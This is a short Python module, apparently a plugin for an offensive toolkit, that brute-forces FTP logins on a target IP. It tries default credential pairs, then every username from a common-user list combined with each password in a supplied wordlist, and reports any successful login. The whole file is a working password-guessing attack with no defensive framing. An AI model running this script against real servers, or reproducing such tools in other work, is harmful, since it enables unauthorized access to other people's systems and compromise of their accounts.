import ftplib
import os
from assets.wordlist.userpass import DEFAULT_CREDS, COMMON_USERS
from app.utility.colors import C

REQUIRED_OPTIONS = {
        "IP"            : "",
        "PASS"          : ""
    }

def test_ftp(target_ip, port, username, password):
    ftp = ftplib.FTP()
    try:
        ftp.connect(target_ip, int(port), timeout=2)
        ftp.login(username, password)
        return True
    except:
        return False
    finally:
        try: ftp.quit()
        except: pass

def execute(options):
    target_ip = options.get("IP")
    port = 21
    wordlist_path = options.get("PASS")

    print(f"{C.HEADER} \n--- FTP BRUTE FORCE: {target_ip} ---")

    for user, passwd in DEFAULT_CREDS:
        if test_ftp(target_ip, port, user, passwd):
            print(f"{C.SUCCESS}  [+] LOGIN SUCCESS! -> U:{user} P:{passwd}")
            return

    if wordlist_path and os.path.exists(wordlist_path):
        with open(wordlist_path, 'r') as f:
            for user in COMMON_USERS:
                f.seek(0)
                for line in f:
                    pw = line.strip()
                    if test_ftp(target_ip, port, user, pw):
                        print(f"{C.SUCCESS} \n  [+] LOGIN SUCCESS! -> U:{user} P:{pw}")
                        return
